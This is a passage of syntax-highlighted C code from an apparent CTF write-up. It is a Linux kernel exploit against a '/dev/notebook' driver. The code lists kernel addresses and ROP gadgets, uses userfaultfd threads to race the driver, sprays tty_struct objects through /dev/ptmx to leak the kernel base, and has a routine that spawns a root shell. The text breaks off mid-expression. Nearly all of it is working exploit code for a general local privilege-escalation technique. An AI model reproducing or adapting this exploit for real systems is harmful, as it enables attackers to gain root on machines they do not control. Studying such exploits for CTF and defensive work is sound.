class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc -o try -pthread -static -masm=intel -Os try.c -lutil</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TTY_STRUCT_SIZE 0x2e0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTM_UNIX98_OPS 0xffffffff81e8e440</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTY_UNIX98_OPS 0xffffffff81e8e320</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810a9b40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810a9ef0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> swapgs_restore_regs_and_return_to_usermode 0xffffffff81a00929 </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> cred_init 0xffffffff8250a0e9</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> init_cred 0xffffffff8225c940</span><br><span class="hljs-comment">//root and no kaslr:cat /proc/kallsyms|grep &quot;swapgs_restore_regs_and_return_to_usermode&quot;</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> push_rdi_pop_rsp_pop_rbp_add_rax_rdx_ret 0xffffffff81238d50</span><br><span class="hljs-comment">//0xffffffff81238d50 : push rdi ; pop rsp ; pop rbp ; add rax, rdx ; ret</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> mov_rsp_rbp_pop_rbp_ret 0xffffffff8107875c</span><br><span class="hljs-comment">//0xffffffff8107875c : mov rsp, rbp ; pop rbp ; ret</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> pop_rbx_pop_rbp_ret 0xffffffff81002141</span><br><span class="hljs-comment">//0xffffffff81002141 : pop rbx ; pop rbp ; ret</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> pop_rbp_ret 0xffffffff81000367</span><br><span class="hljs-comment">//0xffffffff81000367 : pop rbp ; ret</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> pop_rdi_ret 0xffffffff81007115</span><br><span class="hljs-comment">//0xffffffff81007115 : pop rdi ; ret</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ret 0xffffffff81000091</span><br><span class="hljs-comment">//0xffffffff81000091 : ret</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> mov_rdi_rax_call_rdx 0xffffffff8250747f</span><br><span class="hljs-comment">//0xffffffff8250747f : mov rdi, rax ; call rdx</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> pop_rdx_ret 0xffffffff81358842</span><br><span class="hljs-comment">//0xffffffff81358842 : pop rdx ; ret</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> pop_rcx_ret 0xffffffff812688f3</span><br><span class="hljs-comment">//0xffffffff812688f3 : pop rcx ; ret</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> mov_rdi_rax_pop_rbp_ret 0xffffffff81045833</span><br><span class="hljs-comment">// mov rdi, rax; xor eax, eax; cmp rdi, 0x9000000; je 0x245843; pop rbp; ret; ???</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> mov_cr4_rdi_pop_rbp_ret 0xffffffff8101e9f0</span><br><span class="hljs-comment">//0xffffffff8101e9f0 : mov cr4, rdi ; pop rbp ; ret</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> pop_rax_ret 0xffffffff81540d04</span><br><span class="hljs-comment">//0xffffffff81540d04 : pop rax ; ret</span><br><br><span class="hljs-type">int</span> note_fd=<span class="hljs-number">-1</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> tty_fd[<span class="hljs-number">0x800</span>];<br><span class="hljs-type">static</span> <span class="hljs-type">char</span> *buf,*page;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> cnt;<br><span class="hljs-type">void</span> * kernel_base = <span class="hljs-number">0xffffffff81000000</span>;<br><span class="hljs-type">size_t</span> kernel_offset = <span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-literal">NULL</span>, prepare_kernel_cred = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">sem_t</span> sem_add, sem_edit;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">notearg</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">size_t</span> idx;<br>    <span class="hljs-type">size_t</span> size;<br>    <span class="hljs-type">char</span>* buf;<br>&#125; Note;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">void</span>* buf;<br>    <span class="hljs-type">size_t</span> size;<br>    <br>&#125;notebook[<span class="hljs-number">0x10</span>];<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_operations</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_struct</span> * (*<span class="hljs-title">lookup</span>)(<span class="hljs-keyword">struct</span> <span class="hljs-title">tty_driver</span> *<span class="hljs-title">driver</span>,</span><br><span class="hljs-class">            <span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">filp</span>, <span class="hljs-title">int</span> <span class="hljs-title">idx</span>);</span><br>    <span class="hljs-type">int</span>  (*install)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">void</span> (*remove)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">int</span>  (*open)(<span class="hljs-keyword">struct</span> tty_struct * tty, <span class="hljs-keyword">struct</span> file * filp);<br>    <span class="hljs-type">void</span> (*close)(<span class="hljs-keyword">struct</span> tty_struct * tty, <span class="hljs-keyword">struct</span> file * filp);<br>    <span class="hljs-type">void</span> (*shutdown)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">void</span> (*cleanup)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">int</span>  (*write)(<span class="hljs-keyword">struct</span> tty_struct * tty,<br>              <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">int</span> count);<br>    <span class="hljs-type">int</span>  (*put_char)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> ch);<br>    <span class="hljs-type">void</span> (*flush_chars)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">int</span>  (*write_room)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">int</span>  (*chars_in_buffer)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">int</span>  (*ioctl)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg);<br>    <span class="hljs-type">long</span> (*compat_ioctl)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>                 <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg);<br>    <span class="hljs-type">void</span> (*set_termios)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> ktermios * old);<br>    <span class="hljs-type">void</span> (*throttle)(<span class="hljs-keyword">struct</span> tty_struct * tty);<br>    <span class="hljs-type">void</span> (*unthrottle)(<span class="hljs-keyword">struct</span> tty_struct * tty);<br>    <span class="hljs-type">void</span> (*stop)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">void</span> (*start)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">void</span> (*hangup)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">int</span> (*break_ctl)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">int</span> state);<br>    <span class="hljs-type">void</span> (*flush_buffer)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">void</span> (*set_ldisc)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">void</span> (*wait_until_sent)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">int</span> timeout);<br>    <span class="hljs-type">void</span> (*send_xchar)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">char</span> ch);<br>    <span class="hljs-type">int</span> (*tiocmget)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">int</span> (*tiocmset)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-built_in">set</span>, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> clear);<br>    <span class="hljs-type">int</span> (*resize)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> winsize *ws);<br>    <span class="hljs-type">int</span> (*set_termiox)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> termiox *tnew);<br>    <span class="hljs-type">int</span> (*get_icount)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>                <span class="hljs-keyword">struct</span> serial_icounter_struct *icount);<br>    <span class="hljs-type">void</span> (*show_fdinfo)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> seq_file *m);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_CONSOLE_POLL</span><br>    <span class="hljs-type">int</span> (*poll_init)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line, <span class="hljs-type">char</span> *options);<br>    <span class="hljs-type">int</span> (*poll_get_char)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line);<br>    <span class="hljs-type">void</span> (*poll_put_char)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line, <span class="hljs-type">char</span> ch);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> *<span class="hljs-title">proc_fops</span>;</span><br>&#125;;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> * msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx,<span class="hljs-type">size_t</span> size,<span class="hljs-type">char</span>* buf)</span>&#123;<br>    Note note = &#123;<br>        .idx=idx,<br>        .size=size,<br>        .buf=buf,<br>    &#125;;<br>    ioctl(note_fd,<span class="hljs-number">0x100</span>,&amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">del</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx)</span>&#123;<br>    Note note = &#123;<br>        .idx=idx,<br>    &#125;;<br>    ioctl(note_fd,<span class="hljs-number">0x200</span>,&amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">edit</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx,<span class="hljs-type">size_t</span> size,<span class="hljs-type">char</span>* buf)</span>&#123;<br>    Note note = &#123;<br>        .idx=idx,<br>        .size=size,<br>        .buf=buf,<br>    &#125;;<br>    ioctl(note_fd,<span class="hljs-number">0x300</span>,&amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">gift</span><span class="hljs-params">(<span class="hljs-type">char</span>* buf)</span>&#123;<br>    Note note = &#123;<br>        .buf=buf,<br>    &#125;;<br>    ioctl(note_fd,<span class="hljs-number">100</span>,&amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Hexdump</span><span class="hljs-params">(<span class="hljs-type">char</span> *buf, <span class="hljs-type">long</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;(size/<span class="hljs-number">8</span>);i++)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[96m\e[1m[+%02x]:\t0x%016llx\e[0m\n&quot;</span>, i*<span class="hljs-number">8</span>, *(<span class="hljs-type">size_t</span> *)(buf + i*<span class="hljs-number">8</span>));<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;   <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Backing from the kernelspace.\033[0m&quot;</span>);<br><br>    <span class="hljs-keyword">if</span>(getuid())<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">// to exit the process normally instead of segmentation fault</span><br>&#125;<br><br><span class="hljs-type">pthread_t</span> monitor_thread;<br><span class="hljs-type">void</span> <span class="hljs-title function_">registerUserFaultFd</span><span class="hljs-params">(<span class="hljs-type">void</span> * addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len, <span class="hljs-type">void</span> (*handler)(<span class="hljs-type">void</span>*))</span><br>&#123;<br>    <span class="hljs-type">long</span> uffd;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_api</span> <span class="hljs-title">uffdio_api</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_register</span> <span class="hljs-title">uffdio_register</span>;</span><br>    <span class="hljs-type">int</span> s;<br><br>    <span class="hljs-comment">/* Create and enable userfaultfd object */</span><br>    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);<br>    <span class="hljs-keyword">if</span> (uffd == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;userfaultfd&quot;</span>);<br><br>    uffdio_api.api = UFFD_API;<br>    uffdio_api.features = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_API&quot;</span>);<br><br>    uffdio_register.range.start = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) addr;<br>    uffdio_register.range.len = len;<br>    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;<br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);<br><br>    s = pthread_create(&amp;monitor_thread, <span class="hljs-literal">NULL</span>, (<span class="hljs-type">void</span> * (*)(<span class="hljs-type">void</span> *))handler, (<span class="hljs-type">void</span> *) uffd);<br>    <span class="hljs-keyword">if</span> (s != <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;pthread_create&quot;</span>);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">fault_handler_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>    <span class="hljs-type">int</span> page_size=sysconf(_SC_PAGESIZE);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span><br>    <span class="hljs-type">long</span> uffd;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    <span class="hljs-type">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-type">long</span>) arg;<br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>        <span class="hljs-type">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br><br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[31m\e[1mUserfaultfd Start!\e[0m\n&quot;</span>);<br>        <br>        <span class="hljs-comment">/*stop to do what?*/</span><br>        sleep(<span class="hljs-number">100</span>);<br>        <span class="hljs-comment">/**/</span><br>        nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>            errExit(<span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br><br>        <br>        uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page;<br>        uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[31m\e[1mUserfaultfd done!\e[0m\n&quot;</span>);<br>        <span class="hljs-comment">//cnt++;</span><br><br>    &#125;<br>&#125;<br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">evil_edit</span><span class="hljs-params">(<span class="hljs-type">void</span> *args)</span>&#123;<br>    sem_wait(&amp;sem_edit);<br>    edit((<span class="hljs-type">int</span>)args,<span class="hljs-number">0x2000</span>,buf);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">evil_add</span><span class="hljs-params">(<span class="hljs-type">void</span> *args)</span>&#123;<br>    sem_wait(&amp;sem_add);<br>    add((<span class="hljs-type">int</span>)args,<span class="hljs-number">0x50</span>,buf);<br>&#125;<br><br><br><span class="hljs-type">pthread_t</span> <span class="hljs-type">edit_t</span>,<span class="hljs-type">add_t</span>;<br><span class="hljs-type">size_t</span> tty_data[<span class="hljs-number">0x200</span>], fake_tty_data[<span class="hljs-number">0x200</span>], tty_ops, fake_tty_ops_data[<span class="hljs-number">0x200</span>], rop[<span class="hljs-number">0x100</span>];<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> tty_idx,hit_tty;<br><span class="hljs-type">int</span> fake_tty_ops_idx=<span class="hljs-number">-1</span>;<br><span class="hljs-type">int</span> fake_stack_idx=<span class="hljs-number">-1</span>;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span> <span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">cpu_set_t</span> pwn_cpu;<br>CPU_ZERO(&amp;pwn_cpu);<br>    CPU_SET(<span class="hljs-number">0</span>, &amp;pwn_cpu);<br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br>    sem_init(&amp;sem_add, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    sem_init(&amp;sem_edit, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>    saveStatus();<br>    note_fd=open(<span class="hljs-string">&quot;/dev/notebook&quot;</span>,O_RDWR);<br>    <span class="hljs-keyword">if</span> (note_fd==<span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;fuck notebook&quot;</span>);<br>    buf = (<span class="hljs-type">char</span> *)mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x4000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    page=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br>    registerUserFaultFd(buf,<span class="hljs-number">0x4000</span>,fault_handler_thread);<br>    <br>    <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">0x10</span>;i++)&#123;<br>        add(i,<span class="hljs-number">0x60</span>,page);<br>        edit(i,TTY_STRUCT_SIZE,page);<br>    &#125;<br>    sleep(<span class="hljs-number">1</span>);<br>    <br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">0x10</span>;i++)&#123;<br>        pthread_create(&amp;<span class="hljs-type">edit_t</span>, <span class="hljs-literal">NULL</span>, evil_edit,(<span class="hljs-type">void</span>*)i);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Edit threads started.\033[0m&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        sem_post(&amp;sem_edit);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] All threads trapped in userfaultfd.\033[0m&quot;</span>);<br>    usleep(<span class="hljs-number">1000000</span>);<br><br>    <br><br>    <span class="hljs-comment">// heap spraying ---&gt; tty_struct</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">0x100</span>;i++)&#123;<br>        tty_fd[i]=open(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>,O_RDWR);<br>        <span class="hljs-keyword">if</span> (tty_fd[i]==<span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;fuck tty&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Heap spray for tty done.\033[0m&quot;</span>);<br>    usleep(<span class="hljs-number">1000000</span>);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">0x10</span>;i++)&#123;<br>        pthread_create(&amp;<span class="hljs-type">add_t</span>, <span class="hljs-literal">NULL</span>, evil_add,(<span class="hljs-type">void</span>*)i);<br>    &#125; <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Add threads started.\033[0m&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        sem_post(&amp;sem_add);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] All threads trapped in userfaultfd.\033[0m&quot;</span>);<br>    <br>    usleep(<span class="hljs-number">1000000</span>);<br><br>    <span class="hljs-comment">//check tty_magic 0x5401</span><br>    <br>    gift((<span class="hljs-type">char</span>*) notebook);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>    &#123;<br>        read(note_fd, tty_data, i);<br>        <span class="hljs-comment">//printf(&quot;%llx\n&quot;,*((int*)tty_data));</span><br>        <span class="hljs-keyword">if</span> (hit_tty = (*((<span class="hljs-type">int</span>*)tty_data) == <span class="hljs-number">0x5401</span>))<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successfully hit the tty_struct at idx \033[0m%d.\n&quot;</span>, tty_idx = i);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Address of the tty_struct: \033[0m%p.\n&quot;</span>, notebook[i].buf);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!hit_tty)<br>        errExit(<span class="hljs-string">&quot;Failed to hit the tty struct.&quot;</span>);<br><br>    <span class="hljs-comment">//leak kernel_base by tty</span><br>    tty_ops = *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>*)(tty_data + <span class="hljs-number">3</span>);<br>    kernel_offset = ((tty_ops &amp; <span class="hljs-number">0xfff</span>) == (PTY_UNIX98_OPS &amp; <span class="hljs-number">0xfff</span>) ? (tty_ops - 